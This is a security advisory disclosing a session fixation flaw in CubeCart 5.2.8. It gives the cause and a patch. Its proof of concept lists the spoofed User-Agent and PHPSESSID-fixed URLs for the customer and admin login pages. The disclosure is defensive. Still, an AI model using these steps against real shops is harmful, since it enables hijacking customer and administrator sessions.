CubeCart 5.2.8 is vulnerable to a session fixation vulnerability.

The only protection offered is via the User-Agent header field, which can spoofed to match the victim.

=======================
=Proof of Concept.....=
=======================

*Set the User-Agent for both attacker and victim:
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)

*To attack a customer:
Victim visits: http://[CubeCart Site]/index.php?PHPSESSID=1337

*To attack an administrator:
Victim visits: http://[CubeCart Site]/admin.php?PHPSESSID=1337

When the victim logs in, the attacker can visit the same link (using the same User-Agent) and hijack the victim's session.

=======================
=Cause................=
=======================

The PHPSESSID parameter is not ignored and allows an attacker to specify their own session id.

The code handling login procedures do not generate new sessions upon successful authentication.

=======================
=Mitigation...........=
=======================

Upgrade to CubeCart >= 5.2.9

If upgrading is not an option, here is a hackish workaround for the session fixation vulnerability:

In admin.class.php add this at line 324:
$GLOBALS['session']->restart();

In user.class.php add this at line 227:
$GLOBALS['session']->restart();
